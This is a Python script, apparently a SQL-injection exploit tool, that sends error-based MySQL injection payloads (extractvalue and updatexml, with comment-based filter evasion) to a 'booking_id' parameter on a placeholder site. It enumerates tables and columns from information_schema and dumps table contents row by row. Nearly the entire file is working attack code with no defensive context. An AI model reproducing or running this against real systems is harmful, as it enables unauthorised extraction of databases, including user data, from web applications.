#!/usr/bin/python3
# Coded By Mhammad (0xsecurity.com)

import requests
import re
import sys

def hex(string):
  word = string
  word_bytes = word.encode('utf-8')
  word_bytes.decode('utf-8')
  ['{:x}'.format(b) for b in word_bytes]
  def bytes2hex(bytes):
      return '0x'+''.join('{:x}'.format(b) for b in bytes)
  return bytes2hex(word.encode('utf-8'))

def _print(string):
    sys.stdout.write(string)
    sys.stdout.flush()

def GetCount(TableName,Type=""):
    URL = 'https://domain.tld/users/index.php'
    if (Type == 'C'):
      PARAMS = "ref=guest_list&booking_id=3944658+and+extractvalue(0x0a,concat(0x0a,(select+count(/*!50000column_name*/)+from+/*!50000information_schema.columns*/+where+/*!50000table_schema*/=0x64625f6f665f646f6d61696e+and+/*!50000table_name*/="+hex(TableName)+")))"
    else:
      PARAMS = "ref=guest_list&booking_id=3944658+and+extractvalue(0x0a,concat(0x0a,(select+count(1)+from+db_of_domain."+TableName+")))"
    r = requests.get(url = URL,params = PARAMS)
    FOUND = re.search(r"(.*)'<br",r.text)
    return int(FOUND.group(1))



def tables():
  i = 0
  while (i < 186):
    URL = 'https://domain.tld/users/index.php'
    PARAMS = "ref=guest_list&booking_id=3944658+and+updatexml(null,concat(0x0a,(select+/*!50000table_name*/+from+/*!50000information_schema.tables*/+where+/*!50000table_schema*/=0x64625f6f665f646f6d61696e+limit+"+str(i)+",1)),null)"
    r = requests.get(url = URL,params = PARAMS)
    FOUND = re.search(r"(.*)'<br",r.text)
    i = i + 1
    print(FOUND.group(1))



def columns(TableName):
  i = 0
  while (i < GetCount(TableName,'C')):
    URL = 'https://domain.tld/users/index.php'
    PARAMS = "ref=guest_list&booking_id=3944658+and+extractvalue(0x0a,concat(0x0a,(select+/*!50000column_name*/+from+/*!50000information_schema.columns*/+where+/*!50000table_schema*/=0x64625f6f665f646f6d61696e+and+/*!50000table_name*/="+hex(TableName)+"+limit+"+str(i)+",1)))"
    r = requests.get(url = URL,params = PARAMS)
    FOUND = re.search(r"(.*)'<br",r.text)
    i = i + 1
    print(TableName+" => "+FOUND.group(1))



def GetData(Table,Column):
  i = 0
  while(i < GetCount(Table)):
    URL = 'https://domain.tld/users/index.php'
    PARAMS = "ref=guest_list&booking_id=3944658+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x3a,"+Column+")+from+db_of_domain."+Table+"+limit+"+str(i)+",1)))"
    r = requests.get(url = URL,params = PARAMS)
    FOUND = re.search(r"(.*)'<br",r.text)
    i = i + 1
    print(FOUND.group(1))


_print("\n#############################################################")
_print("\n#             Welcome xD  -  Last update in 27/06/2019      #")
_print("\n#                                                           #")
_print("\n#             (*) List the columns tables file              #")
_print("\n#                                                           #")
_print("\n#############################################################\n\n")

f = open("tables.txt","r")
f1 = f.readlines()
for line in f1:
   columns(line.strip());print('--------------------------')
   
